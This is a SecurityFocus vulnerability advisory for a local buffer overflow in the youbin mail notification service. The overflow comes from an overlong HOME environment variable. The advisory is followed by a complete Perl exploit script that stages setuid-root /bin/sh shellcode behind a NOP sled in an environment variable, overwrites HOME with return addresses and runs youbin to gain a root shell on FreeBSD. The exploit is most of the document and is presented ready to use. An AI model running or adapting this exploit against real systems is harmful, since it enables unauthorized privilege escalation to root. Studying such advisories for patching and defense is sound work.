source: http://www.securityfocus.com/bid/7503/info

It has been reported that youbin is vulnerable to a locally exploitable buffer overflow. The problem is said to occur while processing environment variables. Specifically, an internal memory buffer may be overrun while handling a HOME environment variable containing excessive data. This condition may be exploited by attackers to ultimately execute instructions with the privileges of the youbin process, typically root.

It should be noted that although this vulnerability has been reported to affect youbin version 3.4, previous versions might also be affected.

#!/usr/bin/perl
# DSR-youbin.pl - kokaninATdtors.net vs. /usr/ports/mail/youbin
# offset, retaddr and shellcode is for my FreeBSD 4.7-RELEASE, YMMV
# shellcode by eSDee, he's cool
# youbin-3.4          Mail arrival notification service package

$len = 512;
$ret = pack("l",0xbfbffd68);
$nop = "\x90";
$shellcode =    "\x31\xc0\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68".
                "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50".
                "\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

for ($i = 0; $i < $len - length($shellcode); $i++) {
    $buffer .= $nop;
}
$buffer .= $shellcode;
local($ENV{'EGG'}) = $buffer;
local($ENV{'HOME'}) = $ret x 259;
system("youbin");
